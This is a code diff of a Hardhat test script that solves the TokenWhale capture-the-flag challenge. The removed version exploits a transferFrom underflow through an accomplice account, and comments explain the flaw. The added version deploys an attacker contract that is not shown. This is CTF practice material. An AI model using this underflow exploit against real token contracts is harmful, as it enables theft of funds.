@@ -1,64 +1,27 @@
-import crypto from "crypto";
-import { ethers } from "hardhat";
-import { BigNumber, Contract, Signer } from "ethers";
-import { expect } from "chai";
-import { formatEtherscanTx } from "../utils/format";
+import {ethers} from "hardhat";
+import {Contract, Signer} from "ethers";
+import {expect} from "chai";
 
 let accounts: Signer[];
-let eoa: Signer;
-let accomplice: Signer;
+let attacker: Signer;
 let contract: Contract; // challenge contract
-let contractAccomplice: Contract; // challenge contract
-let tx: any;
+let transferValue = 10;
+let finalValue = 1000000;
 
-before(async () => {
-  accounts = await ethers.getSigners();
-  [eoa, accomplice] = accounts.slice(0, 2);
-  const challengeFactory = await ethers.getContractFactory(
-    "TokenWhaleChallenge"
-  );
-  contract = challengeFactory.attach(
-    `0xEcF35a2266BCd5dd1aA6061350F6ef20f508d2bC`
-  );
-  contractAccomplice = contract.connect(accomplice);
-
-  // transfer some funds to accomplice
-  if ((await accomplice.getBalance()).lt(ethers.utils.parseEther(`0.1`))) {
-    tx = eoa.sendTransaction({
-      to: await accomplice.getAddress(),
-      value: ethers.utils.parseEther(`0.1`),
-    });
-  }
+before(async function () {
+    accounts = await ethers.getSigners();
+    attacker = accounts[0];
+    const factory = await ethers.getContractFactory("TokenWhaleChallenge", attacker);
+    contract = factory.attach(`0xc4beb5157BC24eF207eBD62030737ADbE41c2871`);
 });
 
 it("solves the challenge", async function () {
-  const eoaAddress = await eoa.getAddress();
-  const accompliceAddress = await accomplice.getAddress();
+    const factory = await ethers.getContractFactory("TokenWhaleAttacker", attacker);
+    let attackerContract = await factory.deploy(contract.address,transferValue,finalValue);
+    await contract.approve(attackerContract.address,transferValue);
+    await attackerContract.attack();
+});
 
-  console.log(`Checking eoaAddress balance ... ${eoaAddress}`);
-  expect(await contract.balanceOf(eoaAddress)).to.be.gte(
-    BigNumber.from(`1000`)
-  );
-
-  console.log(`Approving accomplice ...`);
-  tx = await contract.approve(accompliceAddress, BigNumber.from(`2`).pow(`255`));
-  await tx.wait()
-
-  console.log(`Transfering to self signed by accomplice ...`);
-  // it uses three vars: from, to, msg.sender
-  // msg.sender shouldn't be used at all and makes the overflow exploit possible
-  tx = await contractAccomplice.transferFrom(eoaAddress, eoaAddress, `1`);
-  await tx.wait();
-  // accomplice has huge amount of tokens now
-  console.log(`Checking accomplice balance ...`);
-  expect(await contract.balanceOf(accompliceAddress)).to.be.gte(
-    BigNumber.from(`1000000`)
-  );
-
-  console.log(`Transfering funds to eoa ...`);
-  tx = await contractAccomplice.transfer(eoaAddress, `1000000`);
-  await tx.wait();
-
-  const isComplete = await contract.isComplete();
-  expect(isComplete).to.be.true;
+after(async function () {
+    expect(await contract.isComplete()).to.eq(true);
 });
